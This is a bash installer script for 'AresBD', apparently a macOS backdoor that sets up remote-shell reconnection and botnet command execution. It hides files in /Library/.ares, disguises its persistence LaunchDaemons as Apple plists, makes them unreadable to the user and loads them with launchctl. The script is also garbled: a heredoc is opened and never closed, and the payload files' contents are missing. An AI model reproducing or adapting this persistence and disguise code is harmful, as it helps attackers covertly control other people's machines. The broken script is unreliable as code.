#!/bin/bash

#  install.sh
#  AresBD
#
#  Copyright (c) 2015 Stsosz Systems. All rights reserved.

cd /

echo "Welcome to the AresBD server installer."
echo "Using port $PORT"
echo "Using server $SERVER"
echo ""
echo "The client will attempt to reconnect to the server every $SHELL_RECONNECT seconds."
echo "The client will attempt to download and execute botnet commands every $BOTNET_RECONNECT seconds."
echo ""
echo "Creating hidden directory..."
mkdir -p /Library/.ares
echo "Done."
echo ""

echo "Making sure that LaunchDaemons folder exists..."
mkdir -p /Library/LaunchDaemons
echo "Done."
echo ""
echo "Copying files..."
echo "Copying connect.sh..."

cat <<ENDOFCONNECTSH >> /Library/.ares/connect.sh


echo "Done."
echo ""

echo "Copying update.sh..."


echo "Done."
echo ""

echo "Copying com.apple.update.plist..."


echo "Done."
echo ""

echo "Copying com.apple.ares.plist..."

echo "Done."
echo ""

echo "Done Copying Files. "
echo ""

echo "Making everything executable..."
chmod +x /Library/.ares/connect.sh
chmod +x /Library/.ares/update.sh
echo "Done"
echo ""

echo "Making sure that the user cannot read plists..."
chmod 600 /Library/LaunchDaemons/com.apple.ares.plist
chmod 600 /Library/LaunchDaemons/com.apple.update.plist
echo "Done."
echo ""

echo "Loading plists into LaunchCTL"
launchctl load /Library/LaunchDaemons/com.apple.ares.plist
launchctl load /Library/LaunchDaemons/com.apple.update.plist
echo "Done."
echo ""

echo "Install Complete."
echo ""

echo "Shutting down..."
#shutdown -h now